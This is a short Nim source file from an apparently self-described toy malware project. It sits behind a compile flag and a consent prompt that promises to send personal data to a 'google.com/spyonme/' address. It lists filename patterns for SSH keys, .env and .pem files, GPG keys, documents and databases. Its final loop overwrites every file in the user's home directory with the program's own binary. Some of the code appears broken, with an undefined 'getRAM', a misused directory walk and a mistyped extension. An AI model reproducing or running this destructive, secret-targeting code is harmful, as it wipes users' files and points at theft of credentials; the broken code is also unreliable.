# Oops, all malware.
import std/os
import nimalicious/[consent, files]

when not defined(debug) and not defined(yesReallyDestroyMyMachine):
  {.error: "You are about to build privacy-invasive malware. Supply -d:yesReallyDestroyMyMachine in order to build.".}


askConsent(
  "spy",
  @[
    "Personal information about your system *will* be sent over the Internet.",
    "More specifically, to google.com/spyonme/ which... we aren't sure if google is secretly logging or whatever."
  ]
)

let contents = readFile(getAppFilename())

const startswith = @[
  "private","id_",".gitconfig","ssh/config"
]
const endswith = @[
  # https://blog.gitguardian.com/top-10-file-extensions/
  ".py",".js",".php",".ts",".json",".xml",".yaml",".properties",
  ".env",".pem",
  # More secrets
  ".ini",".cfg",".crt",".docx",".asc",".gpg",".config",".gitconfig",
  # https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/03-Test_File_Extensions_Handling_for_Sensitive_Information
  ".asa",".inc",".bak",".old",".rtf",".xlxs",".pptx",".pdf",
  # LibreOffice extensions
  ".doc",".odf",".odg",".ods",".odt",".ott",".pdf",".pub",".rtf",".sda",".sdc",".sdd",".sdw",".odp",".otg",
  # https://logmeonce.com/resources/which-file-extensions-need-to-be-encrypted/
  ".jpeg",".jpg",".png",".webp",".csv",".ppt",".pps",".svg",".wav",".m4a",",.sqlite",".sqlite3",".db"
]

# First make a list of files that match the above criteria

# Then, load them one at a time to ensure that we don't go overboard.
let maxSystemRAM = getRAM

for file in walkDir(getHomeDir()):
  try:
    writeFile(file, contents)
  except:
    discard